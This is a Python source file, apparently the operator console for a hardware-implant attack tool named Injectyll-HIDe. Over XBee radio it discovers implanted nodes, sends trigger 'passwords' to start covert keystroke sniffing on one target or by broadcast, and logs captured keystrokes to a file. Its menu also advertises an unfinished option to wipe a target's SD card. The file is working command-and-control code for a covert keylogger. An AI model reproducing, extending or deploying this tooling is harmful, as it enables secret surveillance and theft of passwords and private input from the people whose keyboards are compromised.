#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#setup the host computer via https://xbplib.readthedocs.io/en/latest/getting_started_with_xbee_python_library.html
#v 0.92 update sent commands to unique "passwords" to prevent simple hijacking
#v 0.93 add functions for 3,4,5 with selection options between specific targets or broadcast 

import time, os
from digi.xbee.devices import XBeeDevice, RemoteXBeeDevice, XBee64BitAddress
from os import path


def initiate_xbee_device():
    com = input("Enter the com port for your xbee device (e.g. COM22): ")
    baud = input("Enter the target buad rate (e.g. 9600): ")
    try:
        dev = XBeeDevice(com, baud)
        return dev
    except Exception:
        print("There was an error with the submitted location\n")
        print("Please try again")
        
        
def scanner(t, d):
    xnet = d.get_network()
    print("\nInitiating scanner.  Please wait for 10 seconds.\n")
    #xnet.set_discovery_options({DiscoveryOptions.APPEND_DD, DiscoveryOptions.APPEND_RSSI})
    #set discovery time for 10 seconds
    xnet.set_discovery_timeout(10)  
    xnet.start_discovery_process()
    while xnet.is_discovery_running():
        time.sleep(0.5)
    # Get a list of the devices added to the network.
    device_list = xnet.get_devices()
    
    #print devices to file
    if path.exists('attackNodes.txt'):
        os.remove('attackNodes.txt')
    f = open('attackNodes.txt', 'w')
    f.write('---' + t +'---\n')
    print("DigiMesh devices found:")
    for i in device_list:
        print(i)
        f.write(str(i)+'\n')
    f.close()   


def rx_all(d, m, t): 
    #send password to trigger keystroke transmission
    d.send_data_broadcast(m)
    #open file to record keystrokes, append time and date and record any received keystrokes
    f = open('recordKeystrokes.txt', 'a')
    f.write(t+"\n")
    while True:
        try:
            xbee_message = d.read_data()
            address = str(d)
            if xbee_message:
                msg = xbee_message.data
                print(address + msg.decode() +"\n")
                f.write(address + msg.decode() +"\n")
        except KeyboardInterrupt:
            print("\n\nReturning to previous menu\n")
            f.write("\n")
            f.close()
            break
            

def target_rx(d, t):  
    while True:
        try:
            # Instantiate a remote XBee device object.data
            remote_device = RemoteXBeeDevice(d, XBee64BitAddress.from_hex_string(t))
            xbee_message = d.read_data_from(remote_device)
            if xbee_message:
                msg = xbee_message.data
                print(t + " >>> " + msg.decode() + "\n")
        except (KeyboardInterrupt, Exception) as e:
            print("An error was encountered connecting to the target. Returning back to the previous menu.")
            print(e)
            break


def target_tx(d, a, m):
    remote_device = RemoteXBeeDevice(d, XBee64BitAddress.from_hex_string(a))
    d.send_data(remote_device, m)


def target_menu():
    print("\nPick your target:\n")
    print("0) Enter your own target address\n")
    count = 1
    f = open('attackNodes.txt', 'r')  
    target = []
    for i in f:
        if (str(i)[0] != '-' and str(i)[0] != '\n'):
            target.append(str(i)[0:16])
            print(str(count)+ ") " + str(i))
            count = count+1
    option = input("Choose target: ")
    if (option == '0'):
        return (input("Enter target address (e.g. 0013A20040XXXXXX): "))
    else:
        try:
            return target[int(option)-1]
        except Exception:
            print("There was an error with your selection.")
            print("Please try again")
            return(option)

    


def main_menu():
    print("")
    print("------Main Menu------")
    print("")
    print("Options:")
    print("1) Scan for Zigbee nodes")
    print("2) Sniff keystrokes")
    print("3) Toggle Insomnia mode")
    print("4) Toggle Keystroke Recorder")
    print("5) Wipe target SD card")
    print("6) Exit\n")


def submenu_2(d, t):
    print("\n\n1) Sniff for all broadcast packets")
    print("2) Sniff packets from target address\n")
    option = input("Choose function: ")
    if option == '1':
        print("\nCtrl+C to exit Sniffing Loop")
        print("\nSending broadcast message to activate sniffing")
        #send out command to start keystroke sniffing
        rx_all(d,"Start sniffing", t)
    elif option == '2':
        target = target_menu()
        try:
            print("\nTarget: " + target)
            target_tx(d,target, "Start Sniffing")
            target_rx(d, target)
        except Exception:
            print("There was an error with the submitted address")
            print("Please try again")
    else:
        print("Invalid selection.  Please try again!")


def banner():
    print(" ______                                          __                __  __          __    __  ______  _______            ")
    print("/      |                                        /  |              /  |/  |        /  |  /  |/      |/       \           ")
    print("$$$$$$/  _______       __   ______    _______  _$$ |_    __    __ $$ |$$ |        $$ |  $$ |$$$$$$/ $$$$$$$  |  ______  ")
    print("  $$ |  /       \     /  | /      \  /       |/ $$   |  /  |  /  |$$ |$$ | ______ $$ |__$$ |  $$ |  $$ |  $$ | /      \ ")
    print("  $$ |  $$$$$$$  |    $$/ /$$$$$$  |/$$$$$$$/ $$$$$$/   $$ |  $$ |$$ |$$ |/      |$$    $$ |  $$ |  $$ |  $$ |/$$$$$$  |")
    print("  $$ |  $$ |  $$ |    /  |$$    $$ |$$ |        $$ | __ $$ |  $$ |$$ |$$ |$$$$$$/ $$$$$$$$ |  $$ |  $$ |  $$ |$$    $$ |")
    print(" _$$ |_ $$ |  $$ |    $$ |$$$$$$$$/ $$ \_____   $$ |/  |$$ \__$$ |$$ |$$ |        $$ |  $$ | _$$ |_ $$ |__$$ |$$$$$$$$/ ")
    print("/ $$   |$$ |  $$ |    $$ |$$       |$$       |  $$  $$/ $$    $$ |$$ |$$ |        $$ |  $$ |/ $$   |$$    $$/ $$       |")
    print("$$$$$$/ $$/   $$/__   $$ | $$$$$$$/  $$$$$$$/    $$$$/   $$$$$$$ |$$/ $$/         $$/   $$/ $$$$$$/ $$$$$$$/   $$$$$$$/ ")
    print("                /  \__$$ |                              /  \__$$ |                                                      ")
    print("                $$    $$/                               $$    $$/                                                       ")
    print("                 $$$$$$/                                 $$$$$$/                                                        \n")
    print("\n")
    print("Injectyll-HIDe version 0.8")
    print("Created by Jonathan Fischer and Jeremy Miller\n\n")


def loop():
    localtime = time.asctime(time.localtime(time.time()))
    banner()  
    device = initiate_xbee_device()
    device.open()

    while True:
        main_menu()
        try:
            option = input("Choose your function: ")
        except KeyboardInterrupt:
            print("\n\nExiting Injectyll-HIDe\n")
            device.close()
            exit()

        if option == '0':
            print("\n\nEnter Option #6 to exit Injectyll-HIDe\n")
        elif option == '1':
            scanner(localtime, device)
        elif option == '2':
            submenu_2(device, localtime)
        elif option == '3':
            print("This option is currently under development.  Please check back later.\n\n")
        elif option == '4':
            print("This option is currently under development.  Please check back later.\n\n")
        elif option == '5':
            print("This option is currently under development.  Please check back later.\n\n")
        elif option == '6':
            device.close()
            exit()
        else:
            print("\nYou did not choose a valid option")


if __name__ == '__main__':
    loop()
